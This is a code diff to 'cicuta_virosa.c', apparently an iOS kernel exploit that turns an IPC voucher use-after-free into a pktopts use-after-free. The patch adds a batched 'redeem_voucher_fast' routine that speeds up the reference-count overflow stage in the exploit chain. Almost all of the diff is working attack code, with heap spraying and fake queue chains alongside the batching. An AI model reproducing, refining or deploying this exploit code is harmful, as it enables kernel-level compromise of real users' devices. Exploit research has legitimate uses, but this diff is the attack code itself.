--- a/cicuta_virosa.c
+++ b/cicuta_virosa.c
@@ -98,6 +98,23 @@ kern_return_t redeem_voucher(ipc_voucher_t target, ipc_voucher_t* result)
     return create_voucher(&recipe, result);
 }
 
+static void redeem_voucher_fast(ipc_voucher_t voucher, uint32_t refs)
+{
+    mach_voucher_attr_recipe_data_t *recipes = malloc(sizeof(recipes[0]) * refs);
+    for (int i = 0; i < refs; i++) {
+        recipes[i].key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
+        recipes[i].command = MACH_VOUCHER_ATTR_REDEEM;
+        recipes[i].previous_voucher = voucher;
+        recipes[i].content_size = 0;
+    }
+    ipc_voucher_t redeemed_voucher = IPC_VOUCHER_NULL;
+    kern_return_t kr;
+    kr = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)recipes, sizeof(recipes[0]) * refs, &redeemed_voucher);
+    assert(kr == KERN_SUCCESS);
+    free(recipes);
+}
+
+
 static void* redeem_voucher_thread(void* context)
 {
     volatile struct redeem_race_context* redeem_context = context;
@@ -321,10 +338,14 @@ stage1:
     set_fake_queue_chain_for_fake_element_spray(task_port + offsetof(kport_t, ip_context) - 24, task_port + offsetof(kport_t, ip_context) - 16);
 
     cicuta_log("Stage 3: Convert uaf into pktopts uaf");
-    ipc_voucher_t redeemed_voucher = IPC_VOUCHER_NULL;
-    for (uint32_t i = 1; i < 167777280; ++i)
-    {
-        assert(redeem_voucher(uafed_voucher, &redeemed_voucher) == KERN_SUCCESS);
+    uint32_t redeem_count = 0xa001400 - 1;
+    uint32_t once = MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE / sizeof(mach_voucher_attr_recipe_data_t);
+    uint32_t times = redeem_count / once;
+    for (int i = 0; i < times; i++) {
+        redeem_voucher_fast(uafed_voucher, once);
+    }
+    if (redeem_count % once) {
+        redeem_voucher_fast(uafed_voucher, redeem_count % once);
     }
 
     cicuta_log("Respray fake user_data_element");